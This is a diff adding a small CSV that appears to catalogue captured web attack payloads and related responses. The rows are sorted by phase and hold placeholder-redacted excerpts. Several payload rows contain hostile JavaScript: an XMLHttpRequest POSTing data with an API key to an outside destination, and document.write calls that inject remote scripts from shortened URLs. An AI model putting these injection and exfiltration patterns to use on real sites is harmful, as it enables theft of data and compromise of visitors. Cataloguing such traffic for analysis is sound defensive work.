@@ -1,0 +1,10 @@
+phase,id,kind,parent_id,text_len,excerpt
+early,R0004650,payload,,1048,"x=new XMLHttpRequest;x.open('POST','https://[REDACTED:destination:000002][SERVICE 2 URL 1]',false);x.setRequestHeader('Content-Type','application/json');x.setRequestHeader('X-API-Key','[CREDENTIAL 1]');x.send('{""task_id"""
+early,R0054521,response,R0007041,35,[PROXY 4 URL 72][ENCODED BLOB 2022]
+early,R0058636,response,R0029623,36,[PROXY 4 URL 72][ENCODED BLOB 21665]
+middle,R0131872,payload,,178,[PROXY 4 URL 72][ENCODED BLOB 87674][REDACTED:opaque_marker_tail:000007]   x+='[REDACTED:opaque_fragment:008297]';document.write('<script src=[SHORTENER URL 154881]><\/script>') 
+middle,R0133582,payload,,173,[PROXY 4 URL 72][ENCODED BLOB 89915][REDACTED:opaque_marker_tail:000007]   x+='[REDACTED SENSITIVE CONTENT]';document.write('<script src=[SHORTENER URL 155635]><\/script>') 
+middle,R0135261,payload,,131,[PROXY 4 URL 72][ENCODED BLOB 92145][REDACTED:opaque_marker_tail:000015]   x+='[ENCODED BLOB 92146]';n('//[SHORTENER URL 156350]') 
+late,R0177172,recovered_text,R0113904,72,[PROXY 4 URL 72][ENCODED BLOB 65614][REDACTED:opaque_marker_tail:000004]
+late,R0183624,recovered_text,R0113946,72,[PROXY 4 URL 72][ENCODED BLOB 65631][REDACTED:opaque_marker_tail:000008]
+late,R0189520,recovered_text,R0079162,73,[PROXY 4 URL 72][ENCODED BLOB 53526][REDACTED:opaque_marker_tail:000004] 
